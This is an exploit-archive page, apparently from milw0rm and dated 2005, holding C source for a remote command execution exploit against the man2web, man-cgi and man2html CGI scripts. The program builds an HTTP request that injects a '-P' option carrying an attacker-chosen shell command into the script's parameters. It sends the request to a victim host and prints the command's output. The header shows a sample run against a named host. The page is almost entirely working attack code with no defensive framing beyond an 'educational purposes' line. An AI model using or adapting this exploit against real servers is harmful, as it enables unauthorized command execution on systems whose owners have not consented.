<html>
<head>
<title>man2web <= 0.88 Multiple Remote Command Execution Exploit (update2)</title>
<pre>
/*
 * str0ke@server:~$ ./test some.edu &quot;w&quot; /cgi-bin/man2web 80 1
 * /str0ke
 */
 
 /* dl-mancgi.c v0.2
  * x86/linux multipie man2web cgi-scripts remote command spawn
  * found and coded by tracewar	(darklogic team)		 
  * for educaional purposes only.                                  
  *****************************************************************	
  * greetz goes to:						
  * matan peretz, ofer shaked, setuid, alex, majestic 
  */
 
 
 #include &lt;stdio.h&gt;
 #include &lt;sys/types.h&gt;
 #include &lt;sys/socket.h&gt;
 #include &lt;netinet/in.h&gt;
 #include &lt;netdb.h&gt;
 
 void usage(char *argv0) {
         fprintf(stderr, &quot;x86/linux multipie man2web cgi-scripts remote command spawn\n&quot;);
 	fprintf(stderr, &quot;researched by tracewar\n&quot;);
 	fprintf(stderr, &quot;targets: \n0=man-cgi\n1=man2web\n2=man2html\n\n&quot;);
 	fprintf(stderr, &quot;usage: %s &lt;remote_host&gt; &lt;command&gt; &lt;path&gt; &lt;http server port&gt; &lt;target&gt;\n&quot;, argv0);
         fprintf(stderr, &quot;example:&quot;);
 	fprintf(stderr, &quot; %s 1.2.3.4 w /cgi-bin/man-cgi 80 0\n&quot;,argv0);
         exit(0);
 }
 
 int main(int argc, char **argv) {
         int sock, i, j, len = 0;
         struct sockaddr_in serv_addr;
         struct hostent *crap;
 	char *cp, dummy[50000], buffer[2000] = &quot;GET &quot;;	
         if(argc &lt; 6)
            usage(argv[0]);
 	if(atoi(argv[5]) == 0) {
 			memset(dummy, 0x00, 50000);
 			strcat(dummy, argv[3]);
 			strcat(dummy, &quot;?-P &quot;);
 			strcat(dummy, argv[2]);
 			strcat(dummy, &quot; ls&quot;);} 
 	else if(atoi(argv[5]) == 1) {
               		memset(dummy, 0x00, 50000);
              		strcat(dummy, argv[3]);
             	 	strcat(dummy, &quot;?program=-P &quot;);
            	        strcat(dummy, argv[2]);
            	        strcat(dummy, &quot; ls&quot;);}
 	else if(atoi(argv[5]) == 2) {
 			memset(dummy, 0x00, 50000);
 			strcat(dummy, argv[3]);
 			strcat(dummy, &quot;?section=-P&quot;);
 			strcat(dummy, argv[2]);
 			strcat(dummy, &quot;&amp;topic=w&quot;);}
 	else
 		usage(argv[0]);
 
 	printf(&quot;# crafting buffer string ... &quot;);
          for(i=0, j=4;i &lt; strlen(dummy);i++) {
 		if(dummy[i] == ' ') {
 			strcat(buffer, &quot;%20&quot;);
 			j+=3;}
 		else {
 			buffer[j] = dummy[i];
 			j++;}
 	}
         
 	strcat(buffer, &quot;\r\n&quot;);
         printf(&quot;(done)\n&quot;);
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if(sock &lt; 0)
                 return printf(&quot;# error creating socket.\n&quot;);
         crap = gethostbyname(argv[1]);
         if(crap == NULL)
                 return printf(&quot;# cant resolve the specified hostname: %s\n&quot;, argv[1]);
         else
                 printf(&quot;# connecting to victim... &quot;);
 
         serv_addr.sin_family = AF_INET;
 	serv_addr.sin_port = htons(atoi(argv[4]));
         bcopy((char *)crap-&gt;h_addr, (char *)&amp;serv_addr.sin_addr.s_addr, crap-&gt;h_length);
 
         if (connect(sock, &amp;serv_addr, sizeof(serv_addr)) &lt; 0)
                 return printf(&quot;(error)\n# check again %s:%d\n&quot;, argv[1], atoi(argv[3]));
 
         printf(&quot;(done)\n# sending crafted string... &quot;);
         if( (send(sock, buffer, strlen(buffer), 0)) == -1 )
                 return printf(&quot;\n# error while sending the crafted string.!\n&quot;);
         printf(&quot;(done)\n# waiting for our call ...\n&quot;);
 	memset(buffer, 0x00, 2000);
 	memset(dummy, 0x00, 50000);
 	printf(&quot;\n\n&quot;);
 	while(recv(sock, buffer, 2000, 0) &gt; 0)
 		strcat(dummy, buffer);
 
 	cp = &amp;dummy[0];
 	i = 0; j = 0;
 	len = strlen(dummy);
 
         if(atoi(argv[5]) == 0) {
                 while(strncmp(cp, &quot;&lt;hr&gt;&quot;, 4) &amp;&amp; i &lt; len) {
                         cp++;
                         i++;
                 }
                 cp+=4;
                 while(strncmp(cp, &quot;&lt;hr&gt;&quot;, 4) &amp;&amp; strncmp(cp, &quot;&lt;A&quot;, 2) &amp;&amp; j &lt; len) {
 			j++;
                         cp++;
 		}
                 *cp = '\0';
                 cp = &amp;dummy[0] + i + 4;
         }
 
         else if(atoi(argv[5]) == 1) {
                 while(strncmp(cp, &quot;\&lt;pre\&gt;&quot;, 5) &amp;&amp; i &lt; len) {
                         cp++;
                         i++;
                 }
                 cp+=4;
                 while(strncmp(cp, &quot;pre&quot;, 3) &amp;&amp; j &lt; len) {
 			j++;
                         cp++;
 		}
                 *cp = '\0';
                 cp = &amp;dummy[0] + i + 6;
         }
 
         else if(atoi(argv[5]) == 2) {
                 while(strncmp(cp, &quot;PRE&quot;, 3) &amp;&amp; i &lt; len) {
                         cp++;
                         i++;
                 }
                 cp+=2;
                 while(strncmp(cp, &quot;PRE&quot;, 3) &amp;&amp; j &lt; len) {
 			j++;
                         cp++;
 		}
                 *cp = '\0';
                 cp = &amp;dummy[0] + i + 2;
         }
 
 	if(*cp == '\0')
 		return printf(&quot;# Bad response from the server.\n&quot;);
 
         printf(&quot;%s&quot;, cp);
 	printf(&quot;\n\n&quot;);
         close(sock);
         return 0;
 }

// milw0rm.com [2005-09-04]
</pre>
</html>

